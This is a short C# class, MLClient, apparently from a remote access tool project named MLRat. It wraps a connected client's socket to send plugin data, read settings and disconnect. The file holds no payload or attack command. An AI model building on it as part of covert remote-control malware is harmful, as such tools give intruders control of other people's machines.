using MLRat.Handlers;
using MLRat.Server;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLRat.Networking
{
    public class MLClient : IClient
    {
        private Guid _clientID, _pluginID;
        private MLClientData ClientData;
        public MLClient(Guid id, Guid pid, MLClientData data)
        {
            _clientID = id;
            _pluginID = pid;
            ClientData = data;
        }
        public Guid ID
        {
            get { return _clientID; }
        }

        public void Send(params object[] data)
        {
            ClientData.ClientSocket.Send(_pluginID, (object) data);
        }

        public T GetVariable<T>(string name, T defaultValue)
        {
            try
            {
                return ClientData.Settings.GetSetting<T>(name, defaultValue);
            }
            catch
            {
                return defaultValue;
            }
            
        }

        public void Disconnect()
        {
            ClientData.ClientSocket.Disconnect();
        }
    }
}
